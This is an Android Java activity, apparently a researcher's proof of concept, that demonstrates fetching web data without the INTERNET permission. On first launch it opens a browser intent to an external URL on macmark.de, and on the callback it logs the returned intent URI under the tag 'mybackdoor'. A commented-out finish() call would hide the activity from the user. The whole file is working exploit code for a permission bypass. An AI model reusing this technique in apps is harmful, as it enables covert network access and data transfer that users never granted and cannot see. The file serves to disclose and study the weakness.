package de.macmark.android;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

// Fetching data from the web without permission.
// For more informations take a look at http://www.macmark.de/android.php#example_exploit

public class HelloDroidActivity extends Activity {
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//        setContentView(R.layout.main);
		Log.e("mybackdoor", "Here I'm. With intent action = " + getIntent().getAction());
		if (!getIntent().getAction().equals("android.intent.action.MAIN")) {
			Log.e("mybackdoor", "2nd call, URI: " + getIntent().toURI());
			TextView tv = new TextView(this);
			tv.setText("Hello, Android " + getIntent().toURI());
			setContentView(tv);
//			finish(); // So no one ever sees this activity
		}
		else {
			Log.e("mybackdoor", "first call/start" + getIntent().toURI());
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.macmark.de/pushit.php")));
		}
	}
}